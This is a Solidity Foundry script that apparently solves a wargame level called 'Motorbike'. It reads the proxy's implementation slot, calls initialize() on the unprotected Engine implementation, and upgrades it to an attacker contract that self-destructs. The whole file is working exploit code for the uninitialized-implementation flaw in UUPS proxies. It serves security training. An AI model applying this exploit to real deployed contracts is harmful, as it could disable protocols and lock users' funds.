// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../instance/Level25.sol";

contract ExploitLevel25 is Script {
    Motorbike instance = Motorbike(0x80020A4D9f11D81c7A2B156CeF1919435Bb83CE5);
    Engine engineContract = Engine(
        address(
            uint160(
                uint256(vm.load(address(instance), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        )
    );

    function run() external {
        console.log("Engine address:", address(engineContract));

        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        AttackLevel attackContract = new AttackLevel();

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        engineContract.initialize();
        engineContract.upgradeToAndCall(address(attackContract), abi.encodeWithSignature("destroy()"));
        vm.stopBroadcast();
    }
}

contract AttackLevel {
    function destroy() external payable {
        console.log("Contract destroyed");
        selfdestruct(address(0));
    }
}
